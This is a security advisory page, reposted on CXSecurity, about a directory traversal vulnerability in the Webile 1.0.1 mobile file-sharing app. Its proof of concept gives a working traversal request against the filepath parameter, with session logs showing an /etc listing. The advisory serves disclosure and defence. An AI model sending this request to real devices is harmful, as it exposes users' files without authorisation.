---
title: Webile 1.0.1 Directory Traversal
url: https://cxsecurity.com/issue/WLB-2022100042
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-18
fetch_date: 2025-10-03T20:03:46.810551
---

# Webile 1.0.1 Directory Traversal

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Webile 1.0.1 Directory Traversal** **2022.10.17**  Credit:  **[Vulnerability Laboratory](https://cxsecurity.com/author/Vulnerability%2BLaboratory/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")** | |

Document Title:
===============
Webile v1.0.1 - Directory Traversal Web Vulnerability
References (Source):
====================
https://www.vulnerability-lab.com/get\_content.php?id=2320
Release Date:
=============
2022-10-10
Vulnerability Laboratory ID (VL-ID):
====================================
2320
Common Vulnerability Scoring System:
====================================
7.3
Vulnerability Class:
====================
Directory- or Path-Traversal
Current Estimated Price:
========================
1.000€ - 2.000€
Product & Service Introduction:
===============================
Webile, is a local area network cross-platform file management tool based on http protocol. Using the personal mobile phone as a server in
the local area network, browsing mobile phone files, uploading files, downloading files, playing videos, browsing pictures, transmitting data,
statistics files, displaying performance, etc. No need to connect to the Internet, you can browse files, send data, play videos and other
functions through WiFi LAN or mobile phone hotspot, and no additional data traffic will be generated during data transmission. Support Mac,
Windows, Linux, iOS, Android and other multi-platform operating systems.
(Copy of the Homepage:https://play.google.com/store/apps/details?id=com.wifile.webile&hl=en&gl=US )
Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered a directory traversal web vulnerability in the Webile v1.0.1 Wifi mobile web application.
Affected Product(s):
====================
Product Owner: Webile
Product: Webile v1.0.1 - (Framework) (Mobile Web-Application)
Vulnerability Disclosure Timeline:
==================================
2022-02-06: Researcher Notification & Coordination (Security Researcher)
2022-02-07: Vendor Notification (Security Department)
2022-\*\*-\*\*: Vendor Response/Feedback (Security Department)
2022-\*\*-\*\*: Vendor Fix/Patch (Service Developer Team)
2022-\*\*-\*\*: Security Acknowledgements (Security Department)
2022-10-10: Public Disclosure (Vulnerability Laboratory)
Discovery Status:
=================
Published
Exploitation Technique:
=======================
Remote
Severity Level:
===============
High
Authentication Type:
====================
Open Authentication (Anonymous Privileges)
User Interaction:
=================
No User Interaction
Disclosure Type:
================
Independent Security Research
Technical Details & Description:
================================
A directory traversal web vulnerability has been discovered in the Webile v1.0.1 wifi mobile web application.
The vulnerability allows remote attackers to change the application path in performed requests to compromise the
local application or file-system of a mobile device. Attackers are for example able to request environment
variables or a sensitive system path.
The directory-traversal web vulnerability is located in the insecure web-server configuration. The path of the local user is not
secure restricted and validated. Thus allows an unauthenticated user with wifi access to request local web-server files without
secure permission. The bug itself is located in the filepath parameter of the change\_upload\_dir function.
Exploitation of the directory traversal web vulnerability requires no privileged web-application user account or user interaction.
Successful exploitation of the vulnerability results in information leaking by unauthorized file access and mobile application compromise.
Proof of Concept (PoC):
=======================
The directory traversal web vulnerability can be exploited by remote attackers without user account or user interaction.
For security demonstration or to reproduce the web vulnerability follow the provided information and steps below to continue.
PoC: Exploitation
http://localhost:8080/webile\_select\_dir?t=change\_upload\_dir&filepath=../../../../../../../../../../../../etc/
--- PoC Session Logs ---
http://localhost:8080/webile\_select\_dir?t=change\_upload\_dir&filepath=../../../../../../../../../../../../etc/
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: treeview=0; sessionId=b21814d80862de9a06b7086cc737dae6
Upgrade-Insecure-Requests: 1
-
GET: HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Content-Encoding: gzip
Transfer-Encoding: chunked
--- FS Session Logs ---
Output:
File name
bluetooth
bpf
carrier
compatconfig
init
permissions
ppp
seccomp\_policy
security
selinux
sensors
sysconfig
textclassifier
theme
vintf
epdg
ipm
Security Risk:
==============
The security risk of the directory traversal web vulnerability in the mobile web application is estimated as high.
Credits & Authors:
==================
Vulnerability-Lab [Research Team] -https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties,
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab
or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business profits
or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some states do
not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.
We do not...